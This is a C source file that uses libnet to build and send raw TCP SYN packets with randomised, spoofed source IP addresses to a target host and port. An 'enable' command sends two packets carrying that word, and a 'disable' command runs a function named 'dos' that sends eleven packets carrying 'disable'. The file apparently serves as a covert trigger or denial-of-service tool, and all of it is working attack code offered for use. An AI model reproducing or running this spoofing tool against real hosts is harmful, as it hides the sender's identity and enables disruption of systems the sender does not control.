#include <stdio.h>
#include <string.h>
#include <libnet.h>

int dos(libnet_t *l, char *ip, u_short port, char *err_buf);
int syn(libnet_t *l, char *ip, u_short port, uint8_t *payload, uint32_t payload_s, char *err_buf);

int main(int argc, char *argv[]) {
	char err_buf[LIBNET_ERRBUF_SIZE];
	libnet_t *l = libnet_init(LIBNET_RAW4, NULL, err_buf);
	libnet_seed_prand(l);
	int i;
	
	if (argc != 4) {
		printf("usage: %s [option] [ip] [port]\n", argv[0]);
		return -1;
	}
	char *option = argv[1];
	if (!strcmp(option, "enable")) {
		char payload[] = "enable";
		for(i = 0; i < 2; i++){
			syn(l, argv[2], atoi(argv[3]), payload, sizeof(payload) - 1, err_buf);
		}
	}
	else if (!strcmp(option, "disable")) {
		dos(l, argv[2], atoi(argv[3]), err_buf);
	}
	libnet_destroy(l);	
	return 0;
}

int dos(libnet_t *l, char *ip, u_short port, char *err_buf) {
	int i;
	char payload[] = "disable";
	for (i = 0; i < 11; i++) {
		syn(l, ip, port, payload, sizeof(payload) - 1, err_buf);

	}
}

int syn(libnet_t *l, char *ip, u_short port, uint8_t *payload, uint32_t payload_s, char *err_buf) {
	u_long __ip = libnet_name2addr4(l, ip, 1);
	libnet_ptag_t ret = LIBNET_PTAG_INITIALIZER;
	ret = libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), port, libnet_get_prand(LIBNET_PRu32), 
		0, TH_SYN, libnet_get_prand(LIBNET_PRu16), 0, 0, LIBNET_TCP_H,  payload, payload_s, l, 0);
	if (ret < 0) {
		return -1;
	}
	ret = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 
		64, IPPROTO_TCP, 0, libnet_get_prand(LIBNET_PRu32), __ip, NULL, 0, l, 0);
	if (ret < 0) {
		return -1;
	}
	ret = libnet_write(l);
	if (ret < 0) {
		return -1;
	}
	libnet_clear_packet(l);
	return 0;
}